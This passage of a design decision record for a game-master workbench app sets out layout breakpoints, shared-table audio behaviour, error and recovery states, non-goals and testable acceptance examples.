`AssistantLane` still reads" — and the canvas takes the remainder. The width
comes from the sidebar, never from the chat. **Missing.** Every width below the
one where that fits, and all keyboard and focus behaviour. **Plan.** Layouts are
tested at 375, 768, 900 and 1280 px.

### 10.1 Breakpoints

| ID | Layout | Viewport | Test widths | Columns | Basis |
| --- | --- | --- | --- | --- | --- |
| LAYOUT-1 | **wide** | ≥ 1024 px | 1280 | Canvas closed: `LeftNav` 268 px + chat, inside its existing 48 rem reading column. Canvas open: rail 56 px + chat 472 px fixed + canvas. | S (56 and 472) + P (test widths) + I |
| LAYOUT-2 | **medium** | 768–1023 px | 768, 900 | Rail 56 px always (`LeftNav` opens over the content as a drawer) + **one** content column showing chat *or* canvas. | P + I |
| LAYOUT-3 | **narrow** | < 768 px | 375 | No rail. `LeftNav` is an off-canvas drawer behind a menu button in `TopBar`. One content column. | P + I |

The arithmetic floor for three columns is 1008 px: the 56 px rail, the 472 px
chat floor, and a canvas that needs at least 480 px for its header controls and
a three-cell stat strip. 1024 px is the nearest conventional breakpoint above
it. At 900 px the canvas would have 372 px, so 768 and 900 are single-column by
design, not by accident.

| ID | Decision | Basis |
| --- | --- | --- |
| LAYOUT-4 | On the wide layout the chat stays at 472 px however wide the screen is, and the document is centred in the canvas at its reading measure. There is no user-resizable splitter. | S + N |
| LAYOUT-5 | On medium and narrow, an open document adds a two-segment **Chat / Canvas** switch to the **workspace header**. The document stays open while the GM is in chat, so "stays until dismissed" still holds. A dot on the inactive segment signals news there: a finished lane on Chat, a save problem on Canvas. The live indicators (REVEAL-14, AUDIO-31) share that header, so they are on screen whichever segment is showing. | S + I |
| LAYOUT-6 | **Crossing a breakpoint changes presentation only.** The open document, drafts, an armed tool and a staged reveal draft all survive. Focus moves only if its element ceases to exist, and then to the visible view's heading. | P (`1kg.6.3` AC) + I |
| LAYOUT-7 | There is one shell, so the responsive rail and drawer apply to all four channels. Function is unchanged for Sage, Spell and Rules, and `1kg.6.3` runs the non-GM regression suite at all four widths. | R + I |
| LAYOUT-8 | Heights use `100dvh`, not today's `100vh`, so a mobile URL bar cannot hide the composer. | I |
| LAYOUT-9 | Touch targets hold the existing 44 px floor. Every pointer-only affordance has a keyboard equivalent. Every new transition honours `prefers-reduced-motion`. Both themes are covered. | R + P |
| LAYOUT-10 | Modal surfaces trap focus, close on Escape, return focus to their opener and make the background inert — **except the live indicators, which stay operable above every modal**, so Stop is always one action (X-3). Non-modal surfaces (library panel, slash menu) never trap focus. | P + I |
| LAYOUT-11 | The fragment is written with `replaceState` (CANVAS-30), so the browser's Back button leaves the app rather than stepping through documents. If `1kg.6.3` makes Back close a full-screen view on the narrow layout, any history step that would swap or close a dirty canvas runs the loss guard. | I |

### 10.2 Surfaces by layout

Basis: the lane's 50 px indent and 640 px maximum, and the sheet's 400 px
maximum, are **S**. Everything else is **I**.

| Surface | Wide | Medium | Narrow |
| --- | --- | --- | --- |
| Live indicators (reveal, audio) | workspace header, listing what is live | the same; every Stop keeps its text label | a pill with a count and one labelled **Stop all**, which stops every reveal *and* all audio; tapping the pill opens the named list with its separate Stops |
| Tool rail | one row, with the `/ for all tools` hint | one row; hint hidden below 900 px | one line that scrolls sideways under edge fades; **More** stays pinned at the right; no hint |
| Slash menu | above the composer, up to 320 px wide | the same | composer width, at most 40 % of the viewport height, scrolling |
| Assistant lane | 50 px indent, 640 px maximum | the same | no indent, full width; cards stay compact |
| Canvas header | title, type and meta, version chip, reveal control, export, close | below 560 px of canvas width the meta line hides and **Reveal to party** becomes an icon with an accessible name; **Stop showing** keeps its text | full-screen view: a back control replaces close; export and history move into an overflow menu; reveal and **Stop showing** stay visible |
| Version history | a disclosure inside the canvas | the same | a full-screen sub-view |
| SelectionBar | floats beside the selection; follows its field in the tab order | the same | docks at the bottom edge, clear of the operating system's selection menu |
| RevealSheet | dialog, at most 400 px wide | centred dialog | bottom sheet, full width, at most 85 % of the height |
| Export menu and dialog | menu under the button; dialog at most 480 px | the same | full-width bottom sheet |
| Library, Participants | 320 px overlay panel | the same, over whichever column shows | full-screen view |
| Audio cue card | inside the Cues panel or the thread | the same | full width; the waveform keeps a 44 px-tall slider |
| Customise rail | dialog | dialog | full-screen sheet |
| Player table view | one centred column, at most 640 px | the same | one column, usable from 320 px |

## 11. Audio: timing, reconnect, consent, ducking and multiple instances

Audio is Phase 5 and priority 2, but `1kg.1.4` and `1kg.8.4` need these
semantics now. Transport and storage are `1kg.1.4`'s; this section fixes what
people hear and see.

**Supplied.** Two kinds fixed at upload: "'ambience' loops and ducks under a new
push; 'one-shot' plays once over whatever is running. There is no mixer."
Preview is private — volume is grouped with the "GM-private transport" — and
**Play to table** is separate. A player taps once and "stays accepted"; their
only control is mute. Files arrive "as uploads or pasted share URLs". The usage
example places a cue card in the thread, in a lane authored `You · attached`.
The wire sketch broadcasts `cue.state` with a `position` and a `pending` list of
player names. **Contradictions and gaps.** The loop toggle renders for both
kinds, so a one-shot can be looped. "Ducks under a new push" does not say what
ducks under what. `position` has no clock, so two browsers cannot agree on it.
The waveform is pointer-only. `wire-schema.md` calls cue upload "an ordinary
attachment", but attachments keep extracted text only. Nothing says where the
live strip lives once the cue's card has scrolled away.

### 11.1 Channel model

| ID | Decision | Basis |
| --- | --- | --- |
| AUDIO-1 | The table has exactly two slots: **one ambience, one one-shot**. That is the whole of "no mixer". Audio is always for the whole table; there is no private audio. | S + I |
| AUDIO-2 | Pushes resolve by the matrix below. "Ducks under a new push" is read as *ambience ducks under a one-shot*. The other reading — a new ambience ducks the old one and both keep playing — is two simultaneous ambiences, which is a mixer. | S (resolved) + P (`1kg.8.5`: no simultaneous ambience) + I |
| AUDIO-3 | **A one-shot never loops.** Its loop control is not rendered, and the server rejects `loop` on a one-shot. Ambience loops by default; with loop off it plays to its end and the slot empties. | P (`1kg.8.4` AC) + I |
| AUDIO-4 | Kind is **immutable** after upload. The title can be edited; changing kind means uploading again. | S + P (`1kg.8.5`: "decided edit policy") |

Basis for the matrix: I, resolving S.

| Pushed | Ambience slot | One-shot slot |
| --- | --- | --- |
| ambience B while ambience A is live | A fades out as B fades in, over 1.5 s; after that only B sounds | unaffected |
| a one-shot while ambience is live | ducks to 35 % within 250 ms, holds, and restores over 600 ms when the one-shot ends or is stopped | plays once |
| a one-shot while another one-shot plays | unaffected | the new one replaces the old at once; nothing stacks |
| the one-shot that is already playing | unaffected | restarts from zero — a GM may want the thunder twice |
| the ambience that is already live | no change | unaffected |

A retried command is recognised by its command ID and is not a second push.

### 11.2 Volume, preview, surfaces and table controls

| ID | Decision | Basis |
| --- | --- | --- |
| AUDIO-5 | **The slider is the GM's own volume.** It is never broadcast and is remembered per device. Table loudness belongs to each player's device. Cues are loudness-normalised when processed (`1kg.8.2`) so one cue is not wildly louder than the next. There is no table fader. | S (volume is grouped with the GM-private transport) + P (`1kg.8.5`: "volume ownership is explicit") + I |
| AUDIO-6 | The GM's device **monitors** the live cue by default, under the local slider and a local mute, so the GM hears what the table hears. Previewing a different cue pauses only the monitor; the card says `Table still hearing: <title>`. | I |
| AUDIO-7 | **Preview emits nothing to the table** — no event, and no prefetch hint. | S + P (invariant 7) + I |
| AUDIO-8 | The table's controls are **Play to table** and **Stop**. A push always starts at zero. There is no table seek and no table pause or resume in v1. `cue.play`'s start offset stays in the contract for forward compatibility; the `cue.state` position tick is dropped (AUDIO-11). | S + I · **E-4** |
| AUDIO-9 | There are two Stops. **A cue card's Stop names its cue**: it clears a slot only if that cue still holds it, so a Stop queued in one tab can never silence a newer cue pushed from another. **The live strip's Stop is Stop all**: it clears both slots, so it silences whatever is sounding even if a push was in flight when it was pressed. Ending the session and switching table audio off use Stop all. Both are immediate, idempotent, never queued and have no dialog; clients fade out over 300 ms. | X-3 + P (`1kg.8.6`) + I |
| AUDIO-28 | **A Stop defeats every push issued before it, in either arrival order.** Pushes carry the session's audio epoch; every Stop and every committed push advances it; a stale push is a 409 and is never retried automatically. As with reveals (REVEAL-22), a Stop is never queued, and a push waits only for this client's own unacknowledged Stops. | X-3 + I |
| AUDIO-10 | The waveform's seek is a **labelled slider** that works from the keyboard — arrow keys 5 s, Page keys 30 s, Home and End. The bars are decoration. | P (`1kg.8.4` AC) |
| AUDIO-31 | **Where audio lives for the GM.** A cue's card renders in the Cues panel (LIB-14) and, through **Add to thread** (LIB-26), in the GM thread as a lane authored `You · attached`. **While any cue is live, an `AudioLiveStrip` with a Stop-all sits in the workspace header beside the reveal indicator**, on every layout and in every channel — so silence is one action even after the card has scrolled away (X-3, X-9). | S (the lane example) + I |
| AUDIO-29 | **Table clients never receive a cue's title or filename** — both can be spoilers. They get an opaque asset reference, the kind, the loop flag and the timing. | X-2 + I |
| AUDIO-30 | **Every gain change — ducking, crossfades, fades — goes through a Web Audio gain stage**, never `element.volume`, which iOS does not let a script set. The audio context is unlocked by the consent tap, and cue media is served same-origin so that it is usable there (X-10). `1kg.8.2` should transcode uploads to one seek-friendly format. | I |

### 11.3 Timing and reconnect

| ID | Decision | Basis |
| --- | --- | --- |
| AUDIO-11 | **The server owns the clock.** A slot stores the cue, `started_at` on the server's clock, a start offset, the loop flag, the duration and a sequence. Clients derive position from `started_at` and an estimated clock offset. **No position ticks are broadcast.** | P (`1kg.8.6`: server-authoritative state) + I |
| AUDIO-12 | **Clients start a cue when they receive it**, at the position derived from `started_at`. A scheduled start a second or two ahead was considered and dropped: it buys tight synchronisation, which v1 does not need (AUDIO-27). | I |
| AUDIO-13 | *Suggested* targets, to be proven by `1kg.1.4`'s load test: audible within 3 s of a push at p95; ambience within ±2 s of the authoritative position, re-seeked only on reconnect, on resume, or on return to visibility; one-shots play on receipt and are never re-seeked. Tighter sync would need sample-accurate scheduling and would still not fix the one case where it is audible (AUDIO-27). | I |
| AUDIO-14 | Late join and reconnect: ambience joins at the computed position. A one-shot with at least 1 s left joins at its position; otherwise it is skipped silently. | P (`1kg.8.6`: "reconnect computes a usable position") + I |
| AUDIO-15 | **Snapshot, then events.** A client first takes a snapshot — the session, and each slot it is entitled to with its sequence — then applies only events with a higher sequence. High-water marks are **per slot**. An event is applied only if its sequence is above its slot's mark, so duplicates and stale events are dropped, and a gap forces a new snapshot. A snapshot is applied unless a *newer* event for that slot has already been applied — so a slow snapshot cannot undo a newer Stop. **Blanking or reconnecting resets the marks**, which is what lets an unchanged slot be shown again after TABLE-7 or TABLE-11. *Suggested:* backoff of 1, 2, 4 … 30 s with jitter. | P (`1kg.7.5`, `1kg.8.6` AC) + I |
| AUDIO-16 | While a table client's connection is silent, **ambience** plays on through the 10 s grace and then fades out, because a Stop could not reach it (X-4, TABLE-7). A one-shot, at most 30 s long, may simply finish. | X-4 + I |
| AUDIO-17 | While the **GM** is disconnected the live strip shows `Reconnecting…` and **Play to table** is disabled. **Stop stays enabled**, queues and retries. A late Stop is safe because it names its cue (AUDIO-9). | X-3 + I |

### 11.4 Consent and presence

| ID | Decision | Basis |
| --- | --- | --- |
| AUDIO-18 | The consent boundary is **one tap per page load** of the table client, held in memory only. A reload asks again. The supplied "for the rest of the session" is narrowed to this because a browser cannot carry its audio unlock across page loads. | S (narrowed) + P (`1kg.8.7`: "documented boundary") |
| AUDIO-19 | While table audio is on, a joining client at once shows a small `Tap to enable sound` banner, so the first cue is not the one that gets missed. If a cue arrives before the tap, the full `AudioConsentPrompt` appears; on the tap, ambience joins at its position and an expired one-shot is skipped. | S + I |
| AUDIO-20 | **Mute** is a player toggle. Muted is not pending: the player chose it. | S + I |
| AUDIO-21 | The GM sees `<n> listening · <n> muted · <alias> hasn't tapped in yet`. **Names appear only for enrolled participants** (§8). Guests are counted: `1 guest hasn't tapped in yet`. Names travel only on the GM's authenticated channel — never to table clients, logs, traces or metrics. | S + P + I |
| AUDIO-22 | **Listening means playback is actually running and unmuted**, whether or not the tab is visible — a remote player keeps the table in a background tab. Presence converges: a tap or a mute shows within 5 s; a vanished client drops within 45 s. Counts are never announced to a screen reader on every change (STATE-7). | P (`1kg.8.7` AC) + I |
| AUDIO-23 | Mobile browsers suspend audio on lock; on return the client resyncs from a snapshot. A hardware silent switch cannot be detected — a documented limitation. | I |

### 11.5 Multiple instances, sources and limits

| ID | Decision | Basis |
| --- | --- | --- |
| AUDIO-24 | **Requirement:** slot state is authoritative in one shared store; any instance can serve any control and any client; controls are idempotent by command ID and ordered by the server; no client depends on sharing an instance with the GM; two GM tabs are both valid controllers and converge through the same stream; presence is aggregated across instances from expiring entries. *Suggested mechanism:* Postgres-held state, a transactional outbox and per-instance fanout. The choice is `1kg.1.4`'s. | P + I |
| AUDIO-25 | **Cues are uploaded first.** Remote-URL import stays in the epic (`1kg.8.1`) but ships behind its own capability flag, after `1kg.1.3`'s SSRF policy exists. A third-party URL is **never hot-linked to players**: that would hand each player's IP address to a third party and let the sound change after the GM previewed it. Imports are fetched by the server and re-hosted. Cue bytes need real object storage; they are not "an ordinary attachment". | P (sequenced) + I (rejects S) · **E-4** |
| AUDIO-26 | *Suggested bounds* for `1kg.1.4` and `1kg.8.1`: ambience up to 10 minutes and 20 MB; one-shots up to 30 seconds and 5 MB; MP3, M4A (AAC), OGG and WAV accepted, verified by magic bytes. | I |
| AUDIO-27 | **Known limitation.** Several phones playing the same ambience in one room will echo, whatever the sync tolerance. At an in-person table the GM should preview through a speaker; push-to-table suits remote and hybrid play. v1 does not solve this, which is also why it does not pay for tight sync. | I |

## 12. Empty, loading, error, retry and recovery states

### 12.1 Rules for every surface

| ID | Rule | Basis |
| --- | --- | --- |
| STATE-1 | An error never blanks content that is already on screen. (The table client's fail-closed withdrawal, X-4, is the deliberate exception.) | I |
| STATE-2 | Every error names its next action. None is a dead end. | I |
| STATE-3 | Retries are idempotent: the same invocation ID, base revision or command ID. | P |
| STATE-4 | Loading is a skeleton plus a polite `role="status"` message, following today's `Recalling the conversation…`. A spinner is never the only signal, and motion honours `prefers-reduced-motion`. | R + I |
| STATE-5 | HTTP mapping: **401** raises a `Your session expired` banner with **Sign in again** and, while the canvas is dirty, **Copy my unsaved text** — there is no router to carry state across a login; during a live reveal it also follows REVEAL-16. **403** and **404** on a resource share one generic unavailable state. **409** enters a conflict flow — or, from the Workbench cap, shows RAIL-16's waiting message. **422** attaches to the field or the brief. **429** follows RAIL-20's three cases. **5xx** and **503** say `Aetheril can't reach its library right now. Nothing was lost.` with **Retry**, matching the service's fail-closed posture. | R + P + I |
| STATE-6 | Offline — `navigator.onLine` is false, or network failures repeat — raises `You're offline — changes aren't saved. Keep this tab open.` Autosave pauses and resumes; billable submits are disabled. After two minutes offline with a dirty canvas (*suggested*) the banner offers **Copy my unsaved text**, because a mobile browser may discard a background tab without warning. | I |
| STATE-7 | Announcements are rationed: one when an operation starts and one when it finishes or fails. Presence counts and save ticks are not announced on every change. | P (`1kg.8.4`: "avoid noise") + I |
| STATE-8 | **Every billable operation, and every new attempt at one, passes the cost guards before provider work; replays of a stored result are free.** Today both guards sit only inside `/chat`, and the daily cap counts `chat.messages` rows — so a tool turn stored anywhere else would escape the only durable cap, and one GM's prep session could spend the whole pilot's day. The daily cap must therefore count a durable record of billable operations — **the operation cost ledger that `agent-forge-harness-yje.5.1` owns**; Workbench operations record into it and do not grow a store of their own. Today's numbers stay in force until the owner chooses others, and they do not fit: 20 an hour would throttle an ordinary prep session within minutes. Owners: `1kg.4.1` and `1kg.4.6`, with epic `yje` for budgets. | R · **E-8** |

### 12.2 Matrix

Basis: the lane's working and error visuals are **S**; the thread's history
states are **R**; everything else is **I**.

| Surface | Empty | Loading | Error | Retry and recovery |
| --- | --- | --- | --- | --- |
| GM thread | today's per-channel prompt; with no campaign, `Choose or create a campaign to use GM tools` | `Recalling the conversation…` | a history failure is a system message above a usable thread, as today | reopen the conversation; **Load earlier** retries in place |
| Assistant lane | — | `working` and its label; `Still working…` at 30 s | §3.4 | **Try again**, **Edit brief**, **Check again**, **Run again** |
| Tool rail | no pins: More and the hint | none — the registry ships in the bundle | capability lookup failed: every tool disabled with `Couldn't check which tools are available` | **Retry** on the rail; plain chat is unaffected |
| Slash menu | `No tool matches "/xyz"` | — | — | — |
| Campaign picker | `Create your first campaign` — only a name is required | skeleton rows | `Couldn't load campaigns` | **Retry**; the other channels are unaffected |
| Participants | AUD-18 | AUD-18 | AUD-18 | **Retry** |
| Canvas | a hand-made document: `Nothing here yet — start typing, or ask the assistant` | skeleton document; the title appears as soon as it is known | `Couldn't open <title>`; unavailable is the generic state (CANVAS-31) | **Retry**; **Back to library** |
| Canvas saving | — | `Saving…` | `Couldn't save — Retry`, with field errors inline | automatic retry with backoff while online; manual **Retry**; typed text is never reverted |
| Version history | `Only one version so far` | skeleton rows | `Couldn't load history` | **Retry**; a failed restore leaves the current version untouched |
| Library list | each category names its way in — NPCs: `No NPCs yet. Run /npc or press New.` Bestiary: `Nothing in the bestiary yet. Run /monster and save it, or press New.` Session log: `No session notes yet. Run /recap at the end of a session.` Cues: `Upload a sound to get started.` A search miss: `Nothing matches "<query>"` with **Clear** | skeleton rows; **Load more** shows inline progress | `Couldn't load <category>` | **Retry** keeps the search text, filter and sort |
| Reveal sheet | `Nothing to reveal yet — this document is empty`; with no session, the **Start session** state | toggles disabled while live state loads; while a Confirm is in flight, only **Stop showing** is enabled (REVEAL-5) | a failed confirm keeps the draft: `Couldn't reveal — Try again`; a 409 follows REVEAL-15 | **Try again**; Stop showing follows REVEAL-16 |
| Live indicators | absent when nothing is live | `Reveal state unknown — reconnecting` (REVEAL-13) | `Couldn't stop showing — retrying` (REVEAL-16) | automatic retry; never reads as "nothing revealed" |
| Table session | `No session running`, with **Start session** | `Starting…` | `Couldn't start the session` | **Retry**; **End session** retries until acknowledged (X-3) |
| Player table | TABLE-2 | TABLE-1 | TABLE-7, TABLE-9, TABLE-10, TABLE-12 | automatic reconnect; a manual **Reload** |
| Audio cue (GM) | — | `Still processing…`, with preview and push disabled until the cue is playable | `This file couldn't be processed`, with **Replace**; a failed push is inline with **Retry**; a preview the browser blocked says `Press play again to allow sound` | AUDIO-17 |
| Audio (player) | — | `Loading sound…` | `Your browser can't play this sound` | the next cue is tried normally; mute is always available |
| Media card | the tool is disabled: RAIL-10 | the `working` lane | as the lane | as the lane |
| Export | — | `Preparing export…` | `Couldn't export` | §9.2 |

## 13. Explicit non-goals

None of these is rejected for ever. Each is a real feature with a real cost, and
none is needed to finish epic `1kg`. A later change that wants one should amend
this record rather than slip it in.

| ID | Not in v1 | Source |
| --- | --- | --- |
| NG-1 | An audio mixer | S (`patterns.md`) |
| NG-2 | Several canvas documents open at once | S |
| NG-3 | Canvas tabs | S |
| NG-4 | A reveal link for each document | S |
| NG-5 | Image or audio generation as a prerequisite for the media UI | S (README scope note) + P |
| NG-6 | A new chat channel for the Workbench | P |
| NG-7 | Replacing Sage, Spell or Rules | P |
| NG-8 | Client-side hiding in place of a server-built projection | P |
| NG-9 | Extracted-text attachments as document or media storage | P |
| NG-10 | A queue or unread badge for generated documents | CANVAS-8 |
| NG-11 | A user-resizable split between chat and canvas | LAYOUT-4 |
| NG-12 | Narration-only turns the assistant does not answer; player-authored turns or table chat | RAIL-14 |
| NG-13 | Suggestions that run on tap; more billable operations in flight than the server's cap | X-1, X-5 |
| NG-14 | Slash commands outside GM mode | SLASH-3 |
| NG-15 | Server-synced rail pins; drag-only reordering | RAIL-12, SLASH-15 |
| NG-16 | Persisting unsaved drafts in the browser; offline editing | CANVAS-15 |
| NG-17 | Duplicate, bulk actions, folders, tag management; a media gallery | LIB-6, LIB-19 |
| NG-18 | Full-text search of document bodies; one search across every category | LIB-21 |
| NG-19 | Per-item reveal inside list fields | REVEAL-12 |
| NG-20 | A player-side shelf or history of reveals; more than one live document per audience slot | REVEAL-7 |
| NG-21 | A reveal that follows the GM's edits live; a one-tap update | REVEAL-8 |
| NG-22 | Player accounts for the table; free-text guest names; co-GMs; a secret note to one player for any type but a character sheet | AUD-1, AUD-7, AUD-9 |
| NG-23 | Table seek, pause or resume; a table fader; prefetch hints; echo compensation; tight multi-device sync | AUDIO-5, AUDIO-7, AUDIO-8, AUDIO-12, AUDIO-27 |
| NG-24 | Hot-linking third-party audio; remote import before SSRF controls exist; private audio for one player | AUDIO-1, AUDIO-25 |
| NG-25 | A server-side PDF renderer; bulk or whole-campaign export; exporting an arbitrary old version; a zip with images; saving loot, names, hooks or rules cards as documents | EXPORT-6, EXPORT-8, EXPORT-11 |
| NG-26 | Several people editing one document at the same time | AUD-1 |
| NG-27 | The assistant choosing by itself to run a tool or edit a document from a conversational message | RAIL-2, CANVAS-21 |
| NG-28 | Several takes of one media result (the README's "take-strip"); media in the canvas | CANVAS-35 |
| NG-29 | Markdown or rich text inside document fields; remote images anywhere | X-10 |
| NG-30 | The canvas, library or tools outside the GM channel | X-9, CANVAS-9 |

## 14. The missing `GM Workbench.dc.html`

**Fact.** The handoff README says: "Design doc (the rationale and every screen):
`GM Workbench.dc.html` in the design project." The supplied archive,
`Aetheril game content cards.zip` (50,205 bytes, modified 2026-09-16 11:43),
lists 35 files, all under `aetheril-gm-workbench/`. **None is
`GM Workbench.dc.html`, and none has a `.dc.html` extension.** This was checked
with `unzip -l` on 2026-09-16. A search of the same machine found one other
`.dc.html` design, in two identical copies — `CampaignChat.dc.html`, in the June
design-system handoff and in its local clone. It is a two-lane campaign-chat
template that predates the Workbench and mentions no canvas, reveal, tool rail,
slash menu, library or audio cue.

**Consequence.** No design was supplied for: the campaign library beyond its
five names; the player table page and its states; participants; rail
customisation; the QR presentation; media expansion; any layout below the wide
three-column one; keyboard and focus behaviour; and every loading, empty, error,
conflict and recovery state except the lane's working and error visuals. The
decisions about those surfaces are inferred — tagged **I**, alone or beside the
supplied fragment they extend — and none should be mistaken for a design that
was handed over.

**If the file arrives.** Run a reconciliation pass before further UI work:

1. Compare each **I** decision with the design, and log the differences in §18.
2. On **layout, visual hierarchy, copy and component anatomy, the design wins**
   unless it breaks an accessibility requirement.
3. On **safety, this record wins** until a named person re-decides it: X-1 to
   X-10; staged widening and the pending sheet (REVEAL-3, REVEAL-5); Stop
   defeating in-flight widenings (REVEAL-22, AUDIO-28); the pinned version and
   the reviewed update (REVEAL-8); explicit masks and audience-aware seeds
   (REVEAL-4, REVEAL-9, REVEAL-23); no credential in a request URL
   (REVEAL-19); per-request asset authorisation (REVEAL-21); single-use
   enrolment (AUD-4, AUD-5); anonymous guests (AUD-7); in-memory drafts
   (CANVAS-15); and no hot-linking (AUDIO-25).
4. The decisions likeliest to change are §6 (library presentation), §8.2
   (participants), §10 (breakpoints and the narrow layout), LIB-8 (one rail
   icon), SLASH-15 (the customise dialog) and the wording of every message.

## 15. Acceptance examples

Each example is written so that it can become a test. "No request" means no
call that could reach a provider. The last column names the decisions it proves.

| ID | Given | When | Then | Proves |
| --- | --- | --- | --- | --- |
| AE-1 | GM mode, a campaign selected, an empty composer | the GM taps **NPC** on the rail | the draft is `/npc `, the composer has focus, the armed-tool row shows NPC, and no request is made | RAIL-1, X-1 |
| AE-2 | the draft `the hooded stranger` | the GM picks **Encounter** from More | the draft is `/encounter the hooded stranger` and focus is in the composer | RAIL-4, SLASH-13 |
| AE-3 | the draft `/npc ` | Enter | no request; the brief hint is announced | RAIL-5 |
| AE-4 | the draft `/recap ` and entries to recap | Enter | one invocation is sent with an empty brief | RAIL-5 |
| AE-5 | the draft `/monster CR 5, drowned` | Enter | one invocation: tool `monster`, brief `CR 5, drowned`; the menu closed at the first space | SLASH-2, SLASH-8 |
| AE-6 | the draft `AC 15/16 seems high` | Enter | an ordinary chat turn; the menu never opened | SLASH-1 |
| AE-7 | the draft `/npcs a guard` | Enter | no request; the unknown-tool message, which mentions `//`; the draft is unchanged | SLASH-4 |
| AE-8 | the draft `/rec` with Recap active in the menu | Enter, then Enter | the first press makes the draft `/recap ` and sends nothing; the second sends | SLASH-11 |
| AE-9 | the menu open on `/m` | Escape, then the key `o` | Escape closes the menu and keeps `/m`; typing reopens it on `/mo` | SLASH-8 |
| AE-10 | Sage mode | the GM sends `/npc x` | it goes to `/chat` verbatim, as today; no menu appeared | SLASH-3, X-9 |
| AE-11 | five tools pinned | the GM opens **Customise rail** | every unpinned toggle is disabled with the explanation; a disabled pinned tool can still be unpinned | RAIL-11, SLASH-15 |
| AE-12 | `portrait` is capability-disabled | the GM opens More | Portrait is listed as disabled with its reason; choosing it arms nothing | RAIL-10 |
| AE-13 | an invocation the server reported as failed with a 503 | **Try again** | the same invocation ID is sent; a new attempt runs and passes the cost guards; exactly one document exists afterwards | RAIL-18, X-6 |
| AE-14 | a `working` `/npc` lane | the GM sends a plain question | both run; each result lands beneath its own turn; Send was never disabled | RAIL-16, X-5 |
| AE-15 | canvas closed, wide layout | `/npc` finishes in the conversation on screen | the dossier opens in the canvas, its link renders too, and focus stays in the composer | CANVAS-1 |
| AE-16 | Ondrey open in the canvas | `/npc the ferryman` finishes | the canvas still shows Ondrey; the lane links the ferryman with **Open in canvas** | CANVAS-3 |
| AE-17 | a conversation holding three document results, and a closed canvas | the page reloads | the canvas stays closed | CANVAS-4 |
| AE-18 | an unsaved edit and a healthy network | the GM opens another document from the library | the edit is saved under `author: gm` and the switch happens with no dialog | CANVAS-16 |
| AE-19 | an unsaved edit while offline | the GM opens another document | the switch is refused with the offline message; no dialog appears and no text is lost | CANVAS-16, STATE-6 |
| AE-20 | an AI edit scoped to `wants` in flight | the GM edits `voice` and it saves | both changes commit; neither is a conflict; `wants` was read-only meanwhile | CANVAS-19, CANVAS-24 |
| AE-21 | another tab has changed `voice` | this tab saves `voice` on its stale base | a 409; both values are shown; the local text survives until the GM chooses | CANVAS-20 |
| AE-22 | Ondrey open in the canvas, no edit armed | the GM sends `make her older` | a chat turn; no version is created | CANVAS-21 |
| AE-23 | an armed edit has just been submitted | the GM sends another message | it is a chat turn | CANVAS-22 |
| AE-24 | an AI edit has just changed `wants` | the GM sends an unrelated message, then presses **Got it**, then reloads | the wash survives the message, clears on **Got it**, and is absent after the reload | CANVAS-28, CANVAS-29 |
| AE-25 | a live table session | `/npc` creates a dossier | the table client still shows waiting and the projection returns no document | X-2, REVEAL-3 |
| AE-26 | a live session, and an NPC with a portrait that has never been revealed | the GM opens the sheet, then cancels | portrait, name and voice were on and the rest off; the table never changed | REVEAL-3, REVEAL-4 |
| AE-27 | every hidden field holds a unique canary string | the GM reveals portrait and name, then exports and prints a player-safe copy | no canary appears in the projection body, its headers, any realtime event, an asset request, the file, or the print view | REVEAL-21, EXPORT-3, EXPORT-7 |
| AE-28 | this tab holds a stale reveal epoch | **Stop showing** | it succeeds, and table clients return to waiting | REVEAL-6, REVEAL-15, REVEAL-22 |
| AE-29 | `notes` is revealed | an AI edit rewrites `notes` | the table is unchanged; the indicator offers **Update…**, whose sheet shows the old and the new text of `notes` | REVEAL-8 |
| AE-30 | document A is live | the GM reveals B | the sheet warned of the replacement; the table shows only B; neither A's projection nor its portrait can be fetched by the client any more | REVEAL-7, REVEAL-21 |
| AE-31 | a character sheet live to Gorath with every toggle on | a new field is added and saved, then the GM opens the sheet | the new field's toggle is off until the GM turns it on; Gorath never saw it | REVEAL-9, AUD-12 |
| AE-32 | Gorath's sheet revealed to Gorath | a guest, another participant and Gorath are connected | only Gorath's device receives it, under `For you`; the others get nothing in any payload or event | AUD-5, AUD-8, REVEAL-24 |
| AE-33 | an expired, a rotated and a never-valid token | each cold-loads the table page | all three receive the identical generic response | TABLE-9 |
| AE-34 | a table client showing a document under live ambience | its connection goes silent for 11 s, then returns | the document hides and the ambience fades; on return it shows whatever a fresh snapshot says | X-4, TABLE-7, AUDIO-16 |
| AE-35 | a saved NPC that is not live | **Export**, then **Player-safe copy** | a menu, then a dialog previewing the exact text; the file holds only that; the filename follows the pattern | EXPORT-1, EXPORT-3, EXPORT-9 |
| AE-36 | a 900 px window, a document open and an unsaved draft | the window widens to 1280 px | 900 px shows the Chat / Canvas switch; 1280 px shows three columns with the same document and draft | LAYOUT-2, LAYOUT-5, LAYOUT-6 |
| AE-37 | a 375 px window | the GM opens the rail, the slash menu and the reveal sheet | the rail is one scrolling line with More visible; the sheet is a bottom sheet; the page never scrolls sideways | §10.2 |
| AE-38 | a table client connected | the GM presses play on a cue card | that connection receives no event | AUDIO-7 |
| AE-39 | live ambience | the GM pushes a one-shot | the ambience ducks and then restores; the one-shot card has no loop control | AUDIO-2, AUDIO-3 |
| AE-40 | live ambience A | the GM pushes ambience B | A fades out as B fades in over 1.5 s; afterwards only B sounds | AUDIO-2 |
| AE-41 | an enrolled participant and a guest who have not tapped | the GM pushes a cue | both see the prompt; the GM sees the participant by alias and the guest as a count; after a tap the ambience starts at the computed position | AUDIO-18 to AUDIO-21 |
| AE-42 | the GM served by one instance and a player by another | push, stop, end session | all three reach the player | AUDIO-24 |
| AE-43 | a stored entry with an unknown result kind | the thread hydrates | that entry is a placeholder and the rest of the thread renders | X-8, RAIL-24 |
| AE-44 | the library open on campaign A with a slow response in flight | the GM switches to campaign B | none of A's rows ever appears | LIB-25 |
| AE-45 | a live document | the GM archives it and confirms | the table returns to waiting and the document is archived, in one step | LIB-17 |
| AE-46 | two tool invocations in flight from one tab | the GM submits a third from a second tab | the server answers 409 naming what is in flight; that tab shows the waiting message; drafting still works in both | X-5, RAIL-16 |
| AE-47 | an unsaved edit whose save fails validation | the GM opens another document | the target loads first; then the dialog appears with **Keep editing** focused; only **Discard changes** loses text | CANVAS-16 |
| AE-48 | a Confirm has been sent; the GM presses **Stop showing**, which is sent at once, and the Stop reaches the server first | the Confirm arrives | it is refused with a 409 and is not retried; the table never shows the document | REVEAL-22, X-3 |
| AE-49 | the same, but the Confirm commits first | the Stop arrives | the slot is cleared and the table returns to waiting | REVEAL-22 |
